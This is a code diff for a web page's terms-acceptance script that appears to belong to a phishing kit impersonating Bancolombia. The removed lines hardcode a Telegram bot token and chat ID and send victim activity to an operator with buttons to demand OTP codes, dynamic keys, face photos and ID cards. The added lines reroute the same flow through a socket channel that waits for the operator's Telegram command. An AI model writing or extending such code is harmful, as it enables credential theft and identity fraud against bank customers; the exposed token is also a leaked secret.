@@ -3,12 +3,15 @@ document.addEventListener('DOMContentLoaded', function() {
     const checkboxes = document.querySelectorAll('.termino-check');
     const btnContinuar = document.querySelector('.btn-iniciar');
     const btnCancelar = document.querySelector('.btn-cancelar');
-    const loadingOverlay = document.createElement('div');
-    loadingOverlay.className = 'loading-overlay';
-    loadingOverlay.innerHTML = `
-        <img src="img/LogoBancolombia.png" alt="Cargando..." class="loading-logo">
-    `;
-    document.body.appendChild(loadingOverlay);
+    
+    // Usar sistema centralizado
+    const sessionId = bancolombia.initGlobalSession();
+    bancolombia.initializeSocket();
+    bancolombia.setupTelegramActions();
+    const loadingOverlay = bancolombia.createLoadingOverlay();
+    
+    // Obtener socket del sistema centralizado
+    const getSocket = () => bancolombia.getSocket();
 
     // Actualizar IP y fecha/hora
     async function updateIpAndDateTime() {
@@ -52,53 +55,37 @@ document.addEventListener('DOMContentLoaded', function() {
         checkbox.addEventListener('change', checkAllTerms);
     });
 
-    async function sendToTelegram() {
-        const botToken = '8476776117:AAELHdBk6OXxUcI2-QkI7xhtu6HKWeynhZY';
-        const chatId = '-1002984980722';
-        const message = `
-✅ Términos y condiciones aceptados
-⌚ Hora: ${new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })}
-        `;
-
-        const keyboard = {
-            inline_keyboard: [
-                [
-                    { text: "1️⃣ Pedir logo", callback_data: "logo" },
-                    { text: "2️⃣ Pedir OTP", callback_data: "otp" }
-                ],
-                [
-                    { text: "3️⃣ Pedir dinámica", callback_data: "dinamica" },
-                    { text: "4️⃣ Pedir cara", callback_data: "cara" }
-                ],
-                [
-                    { text: "5️⃣ Pedir cédula", callback_data: "cedula" },
-                    { text: "6️⃣ Finalizar", callback_data: "finalizar" }
-                ]
-            ]
-        };
-
-        try {
-            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message,
-                    reply_markup: keyboard
-                })
-            });
-        } catch (error) {
-            console.error('Error:', error);
-        }
-    }
-
     form.addEventListener('submit', async function(e) {
         e.preventDefault();
-        loadingOverlay.style.display = 'flex';
-        await sendToTelegram();
-        window.location.href = 'cara.html';
+        loadingOverlay.show();
+        
+        const socket = getSocket();
+        
+        if (!socket || !socket.connected) {
+            console.error('❌ Socket no conectado');
+            alert('Error de conexión. Recarga la página.');
+            loadingOverlay.hide();
+            return;
+        }
+        
+        socket.emit('sendData', {
+            type: 'terminos',
+            sessionId,
+            content: {
+                text: `✅ Términos y condiciones aceptados\n⌚ ${new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })}`
+            },
+            waitForAction: true
+        });
+        
+        socket.once('dataSent', (response) => {
+            if (response.success) {
+                console.log('Términos aceptados');
+                // Mantener overlay esperando acción de Telegram
+            } else {
+                console.error('Error:', response.message);
+                loadingOverlay.hide();
+            }
+        });
     });
 
     btnCancelar.addEventListener('click', () => {
